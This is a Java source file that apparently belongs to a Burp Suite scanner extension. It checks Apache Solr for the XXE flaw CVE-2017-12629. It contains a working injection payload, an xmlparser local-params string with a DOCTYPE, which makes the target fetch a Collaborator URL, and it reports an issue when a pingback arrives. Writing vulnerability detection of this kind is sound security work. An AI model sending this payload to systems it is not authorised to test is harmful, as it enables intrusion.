package burp;
import java.util.ArrayList;
import java.util.List;

import static burp.Utilities.callbacks;
import static burp.Utilities.helpers;
import static burp.OldUtilities.request2;

public class SolrScan extends Scan {
    public SolrScan(String name) {
        super(name);
    }

    @Override
    public List<IScanIssue> doActiveScan (IHttpRequestResponse basePair, IScannerInsertionPoint insertionPoint){
        IBurpCollaboratorClientContext collab = callbacks.createBurpCollaboratorClientContext();
        String obfuscatedPayload = "{!xmlparser v='<!DOCTYPE a SYSTEM \"http://" + collab.generatePayload(true) + "/xxe\"><a></a>'}";
        IHttpRequestResponse attack = request2(basePair, insertionPoint, obfuscatedPayload);
        List<IBurpCollaboratorInteraction> interactions = collab.fetchAllCollaboratorInteractions();

        List<IScanIssue> issues = new ArrayList<>();
        if (!interactions.isEmpty()) {
            issues.add(new CustomScanIssue(
                    attack.getHttpService(),
                    helpers.analyzeRequest(attack).getUrl(),
                    new IHttpRequestResponse[]{attack},
                    "Solr XXE/RCE (CVE-2017-12629)",
                    "The application appears to be running a version of Solr vulnerable to XXE. ActiveScan++ sent a reference to an external file, and received a pingback from the server.<br/><br/>" +
                            "To investigate, use the manual collaborator client. It may be possible to escalate this vulnerability into RCE. Please refer to https://mail-archives.apache.org/mod_mbox/lucene-dev/201710.mbox/%3CCAJEmKoC%2BeQdP-E6BKBVDaR_43fRs1A-hOLO3JYuemmUcr1R%2BTA%40mail.gmail.com%3E for further information",
                    "Firm",
                    CustomScanIssue.severity.High
            ));
        }

        return issues;
    }
}
